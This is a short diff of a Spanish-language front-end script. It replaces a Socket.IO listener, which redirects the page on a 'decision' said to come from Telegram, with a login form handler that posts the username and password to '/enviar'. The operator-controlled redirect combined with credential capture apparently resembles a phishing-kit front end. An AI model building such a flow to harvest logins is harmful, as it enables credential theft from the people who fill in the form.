@@ -1,14 +1,20 @@
-// Conectar con el servidor usando Socket.IO
-const socket = io();
+window.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('login-form').addEventListener('submit', function (e) {
+    e.preventDefault();
+    const usuario = document.getElementById('usuario').value;
+    const clave = document.getElementById('clave').value;
 
-// Esperar respuesta desde Telegram
-socket.on('decision', (data) => {
-  console.log('📨 Respuesta desde Telegram:', data);
-
-  if (data.url) {
-    // Redirigir automáticamente
-    window.location.href = data.url;
-  } else {
-    alert('⚠ Hubo un error con la decisión.');
-  }
+    fetch('/enviar', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ usuario, clave })
+    })
+    .then(res => {
+      if (res.ok) {
+        window.location.href = 'opciones.html';
+      } else {
+        alert('Error al enviar datos');
+      }
+    });
+  });
 });
